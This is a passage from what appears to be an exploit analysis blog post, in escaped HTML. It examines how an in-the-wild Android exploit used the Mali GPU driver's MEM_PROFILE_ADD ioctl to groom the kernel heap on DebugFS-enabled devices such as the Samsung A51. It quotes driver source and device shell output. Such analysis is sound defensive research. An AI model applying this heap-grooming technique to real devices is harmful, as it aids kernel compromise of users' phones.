&amp;nbsp; buf &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kmalloc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;GFP_KERNEL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ZERO_OR_NULL_PTR&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;copy_from_user&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;u64_to_user_ptr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buffer&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EFAULT&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbasep_mem_profile_debugfs_insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;This ioctl takes a pointer to a buffer, the length of the buffer, and padding as arguments. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kbase_api_mem_profile_add&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;will allocate a buffer on the kernel heap and then will copy the passed buffer from userspace into the newly allocated kernel buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Finally, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kbase_api_mem_profile_add&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kbasep_mem_profile_debugfs_insert&lt;/span&gt;&lt;span&gt;. This technique only works when the device is running a kernel with &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;CONFIG_DEBUG_FS&lt;/span&gt;&lt;span&gt;&amp;nbsp;enabled. The purpose of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;MEM_PROFILE_ADD&lt;/span&gt;&lt;span&gt;&amp;nbsp;ioctl is to write a buffer to DebugFS. As of Android 11, DebugFS should not be enabled on production devices. &lt;/span&gt;&lt;span&gt;Whenever Android launches new requirements like this, it only applies to devices launched on that new version of Android. Android 11 launched in September 2020 and the exploit was found in November 2020 so it makes sense that the exploit targeted devices Android 10 and before where DebugFS would have been mounted.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png\" border=\"0\" alt=\"Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs. &amp;nbsp;The highlighted text reads: &amp;amp;quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&amp;amp;quot;\" style=\"max-height: 750px; max-width: 600px;\"title=\"Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs. &amp;nbsp;The highlighted text reads: &amp;amp;quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&amp;amp;quot;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;For example, on the A51 exynos device (SM-A515F) which launched on Android 10, both &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;CONFIG_DEBUG_FS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;is enabled and DebugFS is mounted. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7ecb17c683a1281f47d4612e785891bb86b4709f\"&gt;&lt;/a&gt;&lt;a id=\"t.23\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;/ $ getprop ro.build.fingerprint&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;samsung/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51nnxx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;11&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;RP1A&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;200720.012&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;A515FXXU4DUB1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;user&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;release&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;keys&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;/ $ getprop ro.build.version.security_patch&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;2021-02-01&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;a51:/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;$ uname &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Linux&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;localhost &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;4.14&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;113&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;20899478&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#1 SMP PREEMPT Mon Feb 1 15:37:03 KST 2021 aarch64&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;/ $ cat /&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;proc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;gz &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;gunzip &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;cat &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;grep CONFIG_DEBUG_FS &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;CONFIG_DEBUG_FS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3 vdnyYxSRCi-c9\"&gt;y&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;/ $ cat /&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;proc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mounts &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;grep debug &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sys&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;kernel&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;debug &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sys&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;kernel&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;debug debugfs rw&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;seclabel&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;relatime &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13 vdnyYxSRCi-c9\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13 vdnyYxSRCi-c9\"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Because DebugFS is mounted, the exploit is able to use the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;MEM_PROFILE_ADD&lt;/span&gt;&lt;span&gt;&amp;nbsp;ioctl &lt;/span&gt;&lt;span&gt;to &lt;/span&gt;&lt;span&gt;groom the heap. &lt;/span&gt;&lt;span&gt;If DebugFS wasn&amp;rsquo;t enabled or mounted, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kbasep_mem_profile_debugfs_insert&lt;/span&gt;&lt;span&gt;&amp;nbsp;would simply free the newly allocated kernel buffer and return.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b54890eb264f51ceef4db4a7d94fde1a7369f3a7\"&gt;&lt;/a&gt;&lt;a id=\"t.24\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#ifdef&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;CONFIG_DEBUG_FS&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbasep_mem_profile_debugfs_insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_context &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; size_t size&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mutex_lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mem_profile_lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dev_dbg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbdev&lt;/span&gt;&lt;span 